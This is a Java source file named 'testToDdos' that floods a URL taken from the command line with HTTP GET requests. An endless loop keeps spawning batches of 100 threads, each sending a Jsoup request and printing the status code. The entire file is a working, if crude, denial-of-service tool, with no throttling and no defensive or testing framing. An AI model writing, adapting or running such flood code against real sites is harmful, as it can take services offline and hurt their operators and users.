import org.jsoup.Connection;
import org.jsoup.Jsoup;

import java.io.IOException;

public class testToDdos {

    public static void main(String[] args) {
        while (true) {
            for (int i = 0; i < 100; i++) {
                new Thread() {
                    @Override
                    public void run() {
                        super.run();
                        try {
                            Connection.Response response = Jsoup.connect(args[0])
                                    .method(Connection.Method.GET)
                                    .ignoreContentType(true)
                                    .ignoreHttpErrors(true)
                                    .timeout(30000)
                                    .execute();
                            System.out.println(response.statusCode());
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }.start();
            }
        }


    }
}
